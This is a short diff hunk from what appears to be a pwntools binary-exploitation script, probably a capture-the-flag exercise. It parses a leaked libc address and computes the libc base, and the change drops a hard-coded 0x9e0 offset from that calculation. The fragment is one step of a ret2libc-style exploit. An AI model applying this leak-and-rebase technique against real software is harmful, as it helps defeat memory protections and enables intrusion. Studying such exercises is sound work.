@@ -88,7 +88,7 @@ libcLeak = u64(p.recvline().strip() + b"\x00\x00")      # Makes it into decimal 
 print("LIBC LEAK: ",hex(libcLeak))
 
 # Calculate base
-libcBase = libcLeak - libc.symbols['gets'] - 0x9e0
+libcBase = libcLeak - libc.symbols['gets']
 print("LIBC BASE:", hex(libcBase))
 
 #
